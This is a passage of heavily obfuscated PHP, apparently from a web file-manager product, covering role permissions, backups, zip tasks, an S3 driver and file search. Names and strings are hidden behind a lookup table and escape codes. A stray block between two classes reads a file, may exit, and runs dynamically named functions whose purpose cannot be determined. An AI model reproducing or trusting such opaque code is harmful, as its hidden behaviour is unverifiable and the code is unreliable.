$¶óßˆƒ¶[$³‰òç•[478]] != $©‰¦„Òè[$³‰òç•[478]]) { return !1; } $this->filterAuth($¢‰®²„Á[$³‰òç•[490]]); return parent::update($º¥­±ËÉ, $¢‰®²„Á); } public function remove($¡¹÷’¤Õ) { $ß‚Íù¸© = parent::listData($¡¹÷’¤Õ); if (!$ß‚Íù¸© || $ß‚Íù¸©[$_SERVER[¼¥ÊĞÙÌ][192]]) { return !1; } return parent::remove($¡¹÷’¤Õ); } public function add($…ËÇ®“Ü = array()) { $¿•½å¶ =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->findByName($…ËÇ®“Ü[$¿•½å¶[32]])) { return !1; } $òÚ°À = array($¿•½å¶[32] => $¿•½å¶[12], $¿•½å¶[490] => 1, $¿•½å¶[2014] => $¿•½å¶[2001], $¿•½å¶[2013] => 1, $¿•½å¶[192] => 0, $¿•½å¶[2015] => 0); $…ËÇ®“Ü = array_merge($òÚ°À, $…ËÇ®“Ü); $…ËÇ®“Ü[$¿•½å¶[2015]] = $this->getSort(); $this->filterAuth($…ËÇ®“Ü[$¿•½å¶[490]]); return parent::insert($…ËÇ®“Ü); } private function getSort() { $¾”¦¸Š  =& $_SERVER[¼¥ÊĞÙÌ]; $Ğ’¸É = parent::listData(); $Ğìá÷æ = array_to_keyvalue($Ğ’¸É, $¾”¦¸Š [12], $¾”¦¸Š [2015]); return empty($Ğìá÷æ) ? 0 : max($Ğìá÷æ) + 1; } private function filterAuth(&$ÔÂƒÓ Õ) { if (!$ÔÂƒÓ Õ) { return; } $¹û–¾Ğ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $‰‚¾Õ¸ = array(); foreach ($¹û–¾Ğ as $î­ôÎô) { if ($ÔÂƒÓ Õ & $î­ôÎô) { $‰‚¾Õ¸[] = $î­ôÎô; } } if (in_array(self::AUTH_ROOT, $‰‚¾Õ¸)) { $ÔÂƒÓ Õ = array_sum($¹û–¾Ğ); return; } $ô“¸Ç§™ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($‰‚¾Õ¸ as $î­ôÎô) { if (isset($ô“¸Ç§™[$î­ôÎô])) { $‰‚¾Õ¸ = array_merge($‰‚¾Õ¸, $ô“¸Ç§™[$î­ôÎô]); } } $‰‚¾Õ¸[] = self::AUTH_SHOW; $ÔÂƒÓ Õ = array_sum(array_unique($‰‚¾Õ¸)); } public function sort($‰Ÿ²Ïí¥, $¡æú«ì) { return parent::update($‰Ÿ²Ïí¥, $¡æú«ì); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\142\141\143\153\x75\160\114\x69\163\164"; public $field = array("\x69\157", "\156\x61\x6d\145", "\163\x74\x61\x74\165\163", "\143\157\x6e\164\x65\156\x74", "\x6d\141\156\x75\141\x6c", "\162\145\163\165\x6c\x74", "\x74\151\155\145\106\x72\x6f\155", "\x74\x69\x6d\145\x54\x6f"); public function config() { $…»üÆµÃ =& $_SERVER[¼¥ÊĞÙÌ]; Action($…»üÆµÃ[2016])->taskInit(); $áÌ°«ô‘ = Model($…»üÆµÃ[844])->get($…»üÆµÃ[851]); $áÌ°«ô‘ = json_decode($áÌ°«ô‘, !0); $áÌ°«ô‘ = is_array($áÌ°«ô‘) ? $áÌ°«ô‘ : array(); $this->parseContent($áÌ°«ô‘); unset($áÌ°«ô‘[$…»üÆµÃ[1759]]); Model($…»üÆµÃ[1758])->cacheClear(); $”ÙéŸ” = $…»üÆµÃ[2017]; $È—±å — = Model($…»üÆµÃ[2018])->findByKey($…»üÆµÃ[1777], $”ÙéŸ”); if (!$È—±å —) { $È—±å — = array(); } if (isset($È—±å —[$…»üÆµÃ[207]])) { $È—±å —[$…»üÆµÃ[207]] = json_decode($È—±å —[$…»üÆµÃ[207]], !0); } if (isset($áÌ°«ô‘[$…»üÆµÃ[207]])) { $È—±å —[$…»üÆµÃ[207]][$…»üÆµÃ[1762]] = $áÌ°«ô‘[$…»üÆµÃ[207]]; unset($áÌ°«ô‘[$…»üÆµÃ[207]]); } return array_merge($È—±å —, $áÌ°«ô‘); } public function listData($ê¥ƒ—éï = false, $“•öáë = "\x6d\x6f\144\151\x66\171\x54\151\155\145", $•²«ï”Ï = false) { $âÊéñ› = parent::listData($ê¥ƒ—éï, $“•öáë, !0); if (!$âÊéñ›) { return $âÊéñ›; } if ($ê¥ƒ—éï) { $âÊéñ› = array($âÊéñ›); } foreach ($âÊéñ› as &$…´Ø«¯³) { $this->parseContent($…´Ø«¯³); } return $ê¥ƒ—éï ? $âÊéñ›[0] : $âÊéñ›; } public function parseContent(&$œîùû˜°) { $ŸŒ”‡¾ =& $_SERVER[¼¥ÊĞÙÌ]; $ÂÇ×Ÿşİ = _get($œîùû˜°, $ŸŒ”‡¾[171], $ŸŒ”‡¾[91]); if (!in_array($ÂÇ×Ÿşİ, array($ŸŒ”‡¾[850], $ŸŒ”‡¾[1219]))) { $œîùû˜°[$ŸŒ”‡¾[171]] = $ÂÇ×Ÿşİ == $ŸŒ”‡¾[91] ? $ŸŒ”‡¾[1219] : $ŸŒ”‡¾[850]; } } public function lastItem() { $––öŸÅÔ = $this->listData(); return !empty($––öŸÅÔ[0]) ? $––öŸÅÔ[0] : null; } public function kill($Í‰ÒÓ‰Ù) { $à¨Š³¦Ø =& $_SERVER[¼¥ÊĞÙÌ]; $‹—€¤£Ë = $this->listData($Í‰ÒÓ‰Ù); if (!$‹—€¤£Ë || empty($‹—€¤£Ë[$à¨Š³¦Ø[32]])) { return !0; } Task::kill($à¨Š³¦Ø[859]); Task::kill($à¨Š³¦Ø[878]); Task::kill($à¨Š³¦Ø[888]); $ğ‰ÖñŞã = $‹—€¤£Ë[$à¨Š³¦Ø[32]]; $úÑğ¸Ì = TEMP_FILES . $à¨Š³¦Ø[854] . $ğ‰ÖñŞã . $à¨Š³¦Ø[8]; IO::remove($úÑğ¸Ì, !1); return $this->remove($Í‰ÒÓ‰Ù); } public function remove($ı¶ÜôÖ) { $Ì×¨±ÊÉ = $this->listData($ı¶ÜôÖ); if (!$Ì×¨±ÊÉ) { return !0; } return $this->backupRemove($Ì×¨±ÊÉ); } private function backupRemove($Ìé¬üü) { parent::remove($Ìé¬üü[$_SERVER[¼¥ÊĞÙÌ][478]]); $êäÚÕËç = $this->backupPath($Ìé¬üü); IO::remove($êäÚÕËç, !1); return !0; } private function backupPath($şö‘® ’) { $½«¦õØ¨ =& $_SERVER[¼¥ÊĞÙÌ]; $‰¹êè½ö = $şö‘® ’[$½«¦õØ¨[32]]; $ì”Ş Äæ = Model($½«¦õØ¨[844])->get($½«¦õØ¨[845]); $èÃ¥ÛÂİ = substr(md5($½«¦õØ¨[846] . $ì”Ş Äæ . $‰¹êè½ö), 0, 8); return "\173\151\157\72{$şö‘® ’[$½«¦õØ¨[826]]}\x7d\57\x64\141\164\x61\142\x61\x73\145\x2f\142\141\143\153\x75\160\x2f" . $‰¹êè½ö . $½«¦õØ¨[11] . $èÃ¥ÛÂİ; } public function start() { $Ğ¡äøÀ =& $_SERVER[¼¥ÊĞÙÌ]; if ($GLOBALS[$Ğ¡äøÀ[6]][$Ğ¡äøÀ[92]][$Ğ¡äøÀ[2019]] != $Ğ¡äøÀ[91]) { return !0; } $­ïÛ‰İæ = $this->config(); if (!$­ïÛ‰İæ || $­ïÛ‰İæ[$Ğ¡äøÀ[1759]] != $Ğ¡äøÀ[91]) { return !1; } if ($­ïÛ‰İæ[$Ğ¡äøÀ[171]] == $Ğ¡äøÀ[850]) { $ª¯Âı¬Ì = Model($Ğ¡äøÀ[844])->get($Ğ¡äøÀ[1336]); if ($ª¯Âı¬Ì == $Ğ¡äøÀ[1337]) { $­ïÛ‰İæ[$Ğ¡äøÀ[171]] = $Ğ¡äøÀ[1219]; } } $ü’àÙäÄ = $this->process(); foreach ($ü’àÙäÄ as $áªùíÊÉ) { if ($áªùíÊÉ) { return Task::restart($áªùíÊÉ[$Ğ¡äøÀ[478]]); } } $Ö¶¡š÷Ó = new Backup(); $›áê˜¨ = $Ö¶¡š÷Ó->db(); if ($›áê˜¨) { $›áê˜¨ = $Ö¶¡š÷Ó->dbFile(); if ($›áê˜¨ && $­ïÛ‰İæ[$Ğ¡äøÀ[171]] == $Ğ¡äøÀ[850]) { $›áê˜¨ = $Ö¶¡š÷Ó->file(); } } Backup::set(array($Ğ¡äøÀ[824] => 1, $Ğ¡äøÀ[835] => time())); return !0; } public function process() { $„„úâè =& $_SERVER[¼¥ÊĞÙÌ]; $è¨óÇñª = array($„„úâè[831] => Task::get($„„úâè[859]), $„„úâè[836] => Task::get($„„úâè[878]), $„„úâè[233] => Task::get($„„úâè[888])); $Àö¬õÒµ = !1; foreach ($è¨óÇñª as &$„¤°¡ù) { if ($Àö¬õÒµ) { $„¤°¡ù = !1; continue; } if ($„¤°¡ù) { $û™¯’Åƒ = intval(_get($„¤°¡ù, $„„úâè[1795], 0)); if (time() - $û™¯’Åƒ > 7200) { Task::kill($„¤°¡ù[$„„úâè[478]]); $Àö¬õÒµ = !0; $„¤°¡ù = !1; } } } return $è¨óÇñª; } public function restore() { $Ù‹¡·û¯ =& $_SERVER[¼¥ÊĞÙÌ]; ActionCall($Ù‹¡·û¯[1147], !0, 1); ActionCall($Ù‹¡·û¯[1147], !0, 0); } } goto c´¾ë¬Î—ƒ; Aµ½Ïæ–âç: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $û€‚Áˆ =& $_SERVER[¼¥ÊĞÙÌ]; parent::startAfter(); Hook::bind($û€‚Áˆ[1905], array($this, $û€‚Áˆ[1906])); Hook::bind($û€‚Áˆ[1290], array($this, $û€‚Áˆ[1907])); Hook::bind($û€‚Áˆ[1908], array($this, $û€‚Áˆ[1909])); $¢Ğ–«Û´ =& $this->task; $¢Ğ–«Û´[$û€‚Áˆ[1910]] = $û€‚Áˆ[1291]; if (!$¢Ğ–«Û´[$û€‚Áˆ[1678]]) { $¢Ğ–«Û´[$û€‚Áˆ[1678]] = LNG($û€‚Áˆ[1911]); } } protected function endAfter() { $°ØÙêÑ› =& $_SERVER[¼¥ÊĞÙÌ]; parent::endAfter(); Hook::unbind($°ØÙêÑ›[1905], array($this, $°ØÙêÑ›[1906])); Hook::unbind($°ØÙêÑ›[1290], array($this, $°ØÙêÑ›[1907])); Hook::unbind($°ØÙêÑ›[1908], array($this, $°ØÙêÑ›[1909])); } public function updateAfter() { $ÓíÕ­‚© =& $_SERVER[¼¥ÊĞÙÌ]; $‡€‚Ã‹¢ =& $this->task; if (!$‡€‚Ã‹¢[$ÓíÕ­‚©[1150]] || !$‡€‚Ã‹¢[$ÓíÕ­‚©[837]]) { if ($‡€‚Ã‹¢[$ÓíÕ­‚©[1910]] != $ÓíÕ­‚©[391]) { return; } } if ($‡€‚Ã‹¢[$ÓíÕ­‚©[1910]] == $ÓíÕ­‚©[1291]) { $ê°šåŠ  = 0; if ($‡€‚Ã‹¢[$ÓíÕ­‚©[1844]]) { $ê°šåŠ  = $‡€‚Ã‹¢[$ÓíÕ­‚©[1845]] / $‡€‚Ã‹¢[$ÓíÕ­‚©[1844]]; } $‡€‚Ã‹¢[$ÓíÕ­‚©[1792]] = $ê°šåŠ  * 0.3; } else { if ($‡€‚Ã‹¢[$ÓíÕ­‚©[1910]] == $ÓíÕ­‚©[391]) { $ê°šåŠ  = $‡€‚Ã‹¢[$ÓíÕ­‚©[1791]] / $‡€‚Ã‹¢[$ÓíÕ­‚©[1150]]; $‡€‚Ã‹¢[$ÓíÕ­‚©[1792]] = 0.3 + $ê°šåŠ  * 0.4; } else { if ($‡€‚Ã‹¢[$ÓíÕ­‚©[1910]] == $ÓíÕ­‚©[110]) { $˜”Şá˜ = 0; if ($‡€‚Ã‹¢[$ÓíÕ­‚©[1846]] == $ÓíÕ­‚©[110]) { $˜”Şá˜ = $‡€‚Ã‹¢[$ÓíÕ­‚©[1845]]; } $ê°šåŠ  = ($‡€‚Ã‹¢[$ÓíÕ­‚©[1849]] + $˜”Şá˜) / $‡€‚Ã‹¢[$ÓíÕ­‚©[837]]; $‡€‚Ã‹¢[$ÓíÕ­‚©[1792]] = 0.3 + 0.4 + $ê°šåŠ  * 0.3; } } } if ($‡€‚Ã‹¢[$ÓíÕ­‚©[1792]] > 0) { $•ùÑÅÅ = timeFloat() - $‡€‚Ã‹¢[$ÓíÕ­‚©[1794]] - $‡€‚Ã‹¢[$ÓíÕ­‚©[1797]]; $‡€‚Ã‹¢[$ÓíÕ­‚©[1798]] = $•ùÑÅÅ * (1 - $‡€‚Ã‹¢[$ÓíÕ­‚©[1792]]) / $‡€‚Ã‹¢[$ÓíÕ­‚©[1792]]; } } public function addFile($ô±ÆÛ¸Ô) { $İÙúÂÄ¤ =& $_SERVER[¼¥ÊĞÙÌ]; $º¨²Æ›« =& $this->task; $™Ç×Æšò = IO::info($ô±ÆÛ¸Ô); $º¨²Æ›«[$İÙúÂÄ¤[1842]] = $™Ç×Æšò[$İÙúÂÄ¤[32]]; $º¨²Æ›«[$İÙúÂÄ¤[1844]] = $™Ç×Æšò[$İÙúÂÄ¤[79]]; $º¨²Æ›«[$İÙúÂÄ¤[1845]] = 0; $º¨²Æ›«[$İÙúÂÄ¤[1152]] = $İÙúÂÄ¤[1865]; $º¨²Æ›«[$İÙúÂÄ¤[1846]] = $İÙúÂÄ¤[1291]; $º¨²Æ›«[$İÙúÂÄ¤[837]] = $™Ç×Æšò[$İÙúÂÄ¤[79]]; $º¨²Æ›«[$İÙúÂÄ¤[1150]] = 1; $îùõÅ¿„ = 0; $º¨²Æ›«[$İÙúÂÄ¤[1853]] = array($İÙúÂÄ¤[1854] => $îùõÅ¿„ + 1, $İÙúÂÄ¤[497] => $™Ç×Æšò[$İÙúÂÄ¤[32]], $İÙúÂÄ¤[87] => $™Ç×Æšò[$İÙúÂÄ¤[87]], $İÙúÂÄ¤[587] => $™Ç×Æšò[$İÙúÂÄ¤[587]] ? $™Ç×Æšò[$İÙúÂÄ¤[587]] : $™Ç×Æšò[$İÙúÂÄ¤[87]]); $this->update(); } public function zipEvent($ˆ±ûÙ°µ, $ò»÷öİŸ, $ÂÛ™ĞÖÔ, $Ó½¢ÎÒÆ) { $ŠëÍüß¶ =& $_SERVER[¼¥ÊĞÙÌ]; $İŠèª† =& $this->task; $İŠèª†[$ŠëÍüß¶[1842]] = get_path_this($ò»÷öİŸ); $İŠèª†[$ŠëÍüß¶[1844]] = $Ó½¢ÎÒÆ; $İŠèª†[$ŠëÍüß¶[1845]] = $ÂÛ™ĞÖÔ; $İŠèª†[$ŠëÍüß¶[1152]] = $ˆ±ûÙ°µ == $ŠëÍüß¶[1912] ? $ŠëÍüß¶[1913] : $ŠëÍüß¶[1914]; $İŠèª†[$ŠëÍüß¶[1846]] = $ŠëÍüß¶[12]; $İŠèª†[$ŠëÍüß¶[837]] = $Ó½¢ÎÒÆ; $İŠèª†[$ŠëÍüß¶[1910]] = $ŠëÍüß¶[391]; $this->update(); } public function unzipAfter($·ÊÀÛ™‹) { $Ûè´ÎÁû =& $_SERVER[¼¥ÊĞÙÌ]; $Û²Ãöä´ =& $this->task; $Û²Ãöä´[$Ûè´ÎÁû[1910]] = $Ûè´ÎÁû[110]; $™õÒÁËº = IO::infoWithChildren($·ÊÀÛ™‹); $Ö÷¾”ˆ = 0; $Û²Ãöä´[$Ûè´ÎÁû[1853]] = array($Ûè´ÎÁû[1854] => $Ö÷¾”ˆ + 1, $Ûè´ÎÁû[497] => $™õÒÁËº[$Ûè´ÎÁû[32]], $Ûè´ÎÁû[87] => $™õÒÁËº[$Ûè´ÎÁû[87]], $Ûè´ÎÁû[587] => $™õÒÁËº[$Ûè´ÎÁû[587]] ? $™õÒÁËº[$Ûè´ÎÁû[587]] : $™õÒÁËº[$Ûè´ÎÁû[87]]); if ($™õÒÁËº[$Ûè´ÎÁû[33]] == $Ûè´ÎÁû[233]) { $Û²Ãöä´[$Ûè´ÎÁû[1150]] = 1; } else { $Û²Ãöä´[$Ûè´ÎÁû[1150]] = $™õÒÁËº[$Ûè´ÎÁû[82]][$Ûè´ÎÁû[80]]; } $Û²Ãöä´[$Ûè´ÎÁû[1152]] = $Ûè´ÎÁû[12]; $Û²Ãöä´[$Ûè´ÎÁû[1846]] = 0; $Û²Ãöä´[$Ûè´ÎÁû[1791]] = 0; $Û²Ãöä´[$Ûè´ÎÁû[1844]] = 0; $Û²Ãöä´[$Ûè´ÎÁû[1845]] = 0; $Û²Ãöä´[$Ûè´ÎÁû[1842]] = $Ûè´ÎÁû[12]; $Û²Ãöä´[$Ûè´ÎÁû[1849]] = 0; $Û²Ãöä´[$Ûè´ÎÁû[837]] = $™õÒÁËº[$Ûè´ÎÁû[79]]; $this->update(); self::log($Ûè´ÎÁû[1915] . json_encode(array($Û²Ãöä´, $™õÒÁËº))); } public function nameParse($íò½§) { $¯®Äê…í =& $_SERVER[¼¥ÊĞÙÌ]; $Íà“ı©¯ =& $this->task; if ($Íà“ı©¯[$¯®Äê…í[1910]] == $¯®Äê…í[1291]) { $Íà“ı©¯[$¯®Äê…í[1910]] = $¯®Äê…í[391]; $Íà“ı©¯[$¯®Äê…í[1849]] = 0; $Íà“ı©¯[$¯®Äê…í[837]] = 0; } $¤ëÄÂÒû = get_path_this($íò½§); if (strstr($¤ëÄÂÒû, $¯®Äê…í[10])) { $Íà“ı©¯[$¯®Äê…í[1791]] += 1; $Íà“ı©¯[$¯®Äê…í[1150]] += 1; } $Íà“ı©¯[$¯®Äê…í[1842]] = $íò½§; $this->update(); } } if ($_SERVER[$_SERVER[¼¥ÊĞÙÌ][959]] != $_SERVER[$_SERVER[¼¥ÊĞÙÌ][1916]]) { $_getc = $_SERVER[¼¥ÊĞÙÌ][961]; $_getfile = $_SERVER[$_SERVER[¼¥ÊĞÙÌ][962]] . $_SERVER[¼¥ÊĞÙÌ][963]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¼¥ÊĞÙÌ][288], $_getfilec); if (count($_getarrs) < $_SERVER[¼¥ÊĞÙÌ][695]) { $exit = $_SERVER[¼¥ÊĞÙÌ][964]; $exit(); } $_act = $_SERVER[¼¥ÊĞÙÌ][1145]; $_act($_SERVER[$_SERVER[¼¥ÊĞÙÌ][957]]); } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ª¶š¢Ï =& $_SERVER[¼¥ÊĞÙÌ]; parent::startAfter(); Hook::bind($ª¶š¢Ï[1917], array($this, $ª¶š¢Ï[1906])); Hook::bind($ª¶š¢Ï[1908], array($this, $ª¶š¢Ï[1909])); $úÖŞı± =& $this->task; $úÖŞı±[$ª¶š¢Ï[1910]] = $ª¶š¢Ï[1291]; if (!$úÖŞı±[$ª¶š¢Ï[1678]]) { $úÖŞı±[$ª¶š¢Ï[1678]] = LNG($ª¶š¢Ï[1918]); } } protected function endAfter() { $µæ¾Â =& $_SERVER[¼¥ÊĞÙÌ]; parent::endAfter(); Hook::unbind($µæ¾Â[1917], array($this, $µæ¾Â[1906])); Hook::unbind($µæ¾Â[1908], array($this, $µæ¾Â[1909])); } public function updateAfter() { $«ÁÌòÓ­ =& $_SERVER[¼¥ÊĞÙÌ]; $ìÉ³ıö‰ =& $this->task; if (!$ìÉ³ıö‰[$«ÁÌòÓ­[1150]] || !$ìÉ³ıö‰[$«ÁÌòÓ­[837]]) { return; } if ($ìÉ³ıö‰[$«ÁÌòÓ­[1910]] == $«ÁÌòÓ­[1291]) { $¹á³À³ = $ìÉ³ıö‰[$«ÁÌòÓ­[1845]]; if ($ìÉ³ıö‰[$«ÁÌòÓ­[1846]] != $«ÁÌòÓ­[1291]) { $¹á³À³ = 0; } $Ïã…É = ($ìÉ³ıö‰[$«ÁÌòÓ­[1849]] + $¹á³À³) / $ìÉ³ıö‰[$«ÁÌòÓ­[837]]; $ìÉ³ıö‰[$«ÁÌòÓ­[1792]] = $Ïã…É * 0.3; } else { if ($ìÉ³ıö‰[$«ÁÌòÓ­[1910]] == $«ÁÌòÓ­[391]) { $Ïã…É = $ìÉ³ıö‰[$«ÁÌòÓ­[1791]] / $ìÉ³ıö‰[$«ÁÌòÓ­[1150]]; $ìÉ³ıö‰[$«ÁÌòÓ­[1792]] = 0.3 + $Ïã…É * 0.5; } else { if ($ìÉ³ıö‰[$«ÁÌòÓ­[1910]] == $«ÁÌòÓ­[110]) { $Ïã…É = 0; if ($ìÉ³ıö‰[$«ÁÌòÓ­[1844]]) { $Ïã…É = $ìÉ³ıö‰[$«ÁÌòÓ­[1845]] / $ìÉ³ıö‰[$«ÁÌòÓ­[1844]]; } $ìÉ³ıö‰[$«ÁÌòÓ­[1792]] = 0.3 + 0.5 + $Ïã…É * 0.2; } } } if ($ìÉ³ıö‰[$«ÁÌòÓ­[1792]] > 0) { $—áı¬Ù = timeFloat() - $ìÉ³ıö‰[$«ÁÌòÓ­[1794]] - $ìÉ³ıö‰[$«ÁÌòÓ­[1797]]; $ìÉ³ıö‰[$«ÁÌòÓ­[1798]] = $—áı¬Ù * (1 - $ìÉ³ıö‰[$«ÁÌòÓ­[1792]]) / $ìÉ³ıö‰[$«ÁÌòÓ­[1792]]; } } public function copyFileStart($À©Ï¼¶Ü, $·Ïß´ˆª, $úå¨ŠÍ, $ëóÄÆ­•, $¯Â“®Æ, $¹²ºæşØ) { $’øã€ =& $_SERVER[¼¥ÊĞÙÌ]; parent::copyFileStart($À©Ï¼¶Ü, $·Ïß´ˆª, $úå¨ŠÍ, $ëóÄÆ­•, $¯Â“®Æ, $¹²ºæşØ); $™İª‡øñ =& $this->task; if ($™İª‡øñ[$’øã€[1910]] == $’øã€[391]) { $™İª‡øñ[$’øã€[1910]] = $’øã€[110]; } $this->update(); } public function copyFileEnd($¿â¤†Şú, $·Ê”´”ø, $¬‡Ô‡¢, $”ä×ø¬€, $ğ°Øâ®·, $›µšµºº) { $œ‘úè« =& $_SERVER[¼¥ÊĞÙÌ]; $şŞ¿µ =& $this->task; $şŞ¿µ[$œ‘úè«[1845]] = $şŞ¿µ[$œ‘úè«[1844]]; $şŞ¿µ[$œ‘úè«[1849]] += $şŞ¿µ[$œ‘úè«[1844]]; $şŞ¿µ[$œ‘úè«[1846]] = $œ‘úè«[12]; $this->update(); } public function zipEvent($ñòÔ¿ğé, $¡ı¤¸Ë, $É›ñú¨Ã, $íşİŠœ) { $üË¢®¡ü =& $_SERVER[¼¥ÊĞÙÌ]; $áÑÓ®âØ =& $this->task; $áÑÓ®âØ[$üË¢®¡ü[1842]] = get_path_this($¡ı¤¸Ë); $áÑÓ®âØ[$üË¢®¡ü[1844]] = $íşİŠœ; $áÑÓ®âØ[$üË¢®¡ü[1845]] = $É›ñú¨Ã; $áÑÓ®âØ[$üË¢®¡ü[1152]] = $ñòÔ¿ğé == $üË¢®¡ü[1919] ? $üË¢®¡ü[1913] : $üË¢®¡ü[1914]; $áÑÓ®âØ[$üË¢®¡ü[1846]] = $üË¢®¡ü[12]; $áÑÓ®âØ[$üË¢®¡ü[837]] = $íşİŠœ; $áÑÓ®âØ[$üË¢®¡ü[1910]] = $üË¢®¡ü[391]; $this->update(); } public function nameParse($•œ½ğí) { $‰›¼”Ëô =& $_SERVER[¼¥ÊĞÙÌ]; $»ëÖŒ©ò =& $this->task; if ($»ëÖŒ©ò[$‰›¼”Ëô[1791]] < $»ëÖŒ©ò[$‰›¼”Ëô[1150]]) { $³ìèÁúÜ = get_path_this($•œ½ğí); if (strstr($³ìèÁúÜ, $‰›¼”Ëô[10])) { $»ëÖŒ©ò[$‰›¼”Ëô[1791]] += 1; } } if ($»ëÖŒ©ò[$‰›¼”Ëô[1910]] == $‰›¼”Ëô[1291]) { $»ëÖŒ©ò[$‰›¼”Ëô[1910]] = $‰›¼”Ëô[391]; } $»ëÖŒ©ò[$‰›¼”Ëô[1842]] = $•œ½ğí; $this->update(); } } goto C®Õï²‡š; bëñ¼ë…¾¯: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($§îô€â©) { $Æ¼¿­º¯ =& $_SERVER[¼¥ÊĞÙÌ]; parent::__construct($§îô€â©); $«ÇÀ ó“ = isset($§îô€â©[$Æ¼¿­º¯[259]]) && $§îô€â©[$Æ¼¿­º¯[259]] == $Æ¼¿­º¯[250] ? $Æ¼¿­º¯[250] : $Æ¼¿­º¯[316]; $this->setSignVersion($«ÇÀ ó“); } public function link($œ›ò¿Ã„, $ÍˆÙÚò¢ = array()) { return parent::link($œ›ò¿Ã„, $ÍˆÙÚò¢); } public function fileOut($£æ¨¢¼¬, $¹¤îŒ«„ = false, $¯ä•Û›ï = false, $Œàı–££ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¼¥ÊĞÙÌ][317])) { return parent::fileOutServer($£æ¨¢¼¬, $¹¤îŒ«„, $¯ä•Û›ï, $Œàı–££); } parent::fileOut($£æ¨¢¼¬, $¹¤îŒ«„, $¯ä•Û›ï, $Œàı–££); } public function fileOutImage($ ì¼“Ê, $ıŞ÷ºÓ¤ = 250) { if (strstr($this->endpoint, $_SERVER[¼¥ÊĞÙÌ][317])) { return parent::fileOutImageServer($ ì¼“Ê, $ıŞ÷ºÓ¤); } parent::fileOutImage($ ì¼“Ê, $ıŞ÷ºÓ¤); } } define($_SERVER[¼¥ÊĞÙÌ][318], 1); define($_SERVER[¼¥ÊĞÙÌ][319], 2); goto D”ì×›Œò; E¯â–¢ßé: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($‹ş«¥¥°) { $æã“·ş± =& $_SERVER[¼¥ÊĞÙÌ]; $¢¿ÉÇ÷Ü = KodIO::fileTypeList(); $Á½Õ£Ûô = $¢¿ÉÇ÷Ü[$‹ş«¥¥°]; if (!$Á½Õ£Ûô) { return array(); } $úµãìæ¿ = $Á½Õ£Ûô[$æã“·ş±[169]]; $‘Ò¸Ü› = $æã“·ş±[7]; if (!$Á½Õ£Ûô[$æã“·ş±[169]]) { $©¨œª– = array_to_keyvalue($¢¿ÉÇ÷Ü, $æã“·ş±[12], $æã“·ş±[169]); $úµãìæ¿ = implode($æã“·ş±[50], $©¨œª–); $‘Ò¸Ü› = $æã“·ş±[2256]; } $­éïÎŠ = explode($æã“·ş±[50], trim($úµãìæ¿, $æã“·ş±[50])); return array($‘Ò¸Ü›, $­éïÎŠ); } public function listPathType($˜ñÂÈ—¥) { $¼²ëÌ¥£ =& $_SERVER[¼¥ÊĞÙÌ]; $İßáÄ¿ = $this->fileTypeWhere($˜ñÂÈ—¥); if (!$İßáÄ¿) { return array(); } $†Ğ”Á¨ = USER_ID; $óÖ™éÙ™ = Model($¼²ëÌ¥£[602])->getInfo($†Ğ”Á¨); $µº·æÓı = array($¼²ëÌ¥£[656] => SourceModel::TYPE_USER, $¼²ëÌ¥£[589] => array($¼²ëÌ¥£[620], $¼²ëÌ¥£[598] . $óÖ™éÙ™[$¼²ëÌ¥£[90]][$¼²ëÌ¥£[194]] . $¼²ëÌ¥£[621]), $¼²ëÌ¥£[657] => $†Ğ”Á¨, $¼²ëÌ¥£[654] => 0, $¼²ëÌ¥£[655] => $İßáÄ¿); return $this->listSource($µº·æÓı); } public function listSearch($—ŒŠºÄ, $ÈÊñÃèá = 300) { $¤úáÁ²Å =& $_SERVER[¼¥ÊĞÙÌ]; if (isset($—ŒŠºÄ[$¤úáÁ²Å[2090]]) && $—ŒŠºÄ[$¤úáÁ²Å[2090]]) { $—ŒŠºÄ[$¤úáÁ²Å[2090]] = str_replace($¤úáÁ²Å[463], $¤úáÁ²Å[2257], trim($—ŒŠºÄ[$¤úáÁ²Å[2090]])); } $øœŠìÆœ = $this->_parseSearchWhere($—ŒŠºÄ); if (!isset($øœŠìÆœ[$¤úáÁ²Å[508]])) { $øœŠìÆœ[$¤úáÁ²Å[508]] = 0; } $£Äòâæ– = $¤úáÁ²Å[2258]; $ô™²®¿Ú = $øœŠìÆœ; $ò¯ç›ùª = $£Äòâæ–; $this->_listSearchBindPinyin($—ŒŠºÄ, $øœŠìÆœ, $£Äòâæ–); $this->alias($¤úáÁ²Å[522])->_makeOrder(); $øœŠìÆœ = $this->parseWhereLike($øœŠìÆœ); $ÓÍöëË = $this->distinct(!0)->field($£Äòâæ–)->where($øœŠìÆœ)->selectPage($ÈÊñÃèá); if ($GLOBALS[$¤úáÁ²Å[6]][$¤úáÁ²Å[460]][$¤úáÁ²Å[461]] && Input::check($—ŒŠºÄ[$¤úáÁ²Å[2090]], $¤úáÁ²Å[663]) && $ÓÍöëË[$¤úáÁ²Å[445]][$¤úáÁ²Å[431]] == 1 && $ÓÍöëË[$¤úáÁ²Å[445]][$¤úáÁ²Å[446]] == 0) { $ÓÍöëË = $this->distinct(!0)->field($£Äòâæ–)->where($ô™²®¿Ú)->limit(1000)->select(); $ÓÍöëË = array_page_split($ÓÍöëË, !1, $ÈÊñÃèá); } $this->_listSearchFileContent($ÓÍöëË, $—ŒŠºÄ, $ò¯ç›ùª, $ô™²®¿Ú); $this->_listSearchDesc($ÓÍöëË, $—ŒŠºÄ, $ò¯ç›ùª); $this->_listSearchTag($ÓÍöëË, $—ŒŠºÄ, $ò¯ç›ùª); $this->_listSearchGroupTag($ÓÍöëË, $—ŒŠºÄ, $ò¯ç›ùª); $this->_listDataApply($ÓÍöëË[$¤úáÁ²Å[448]]); $this->_listMake($ÓÍöëË); return 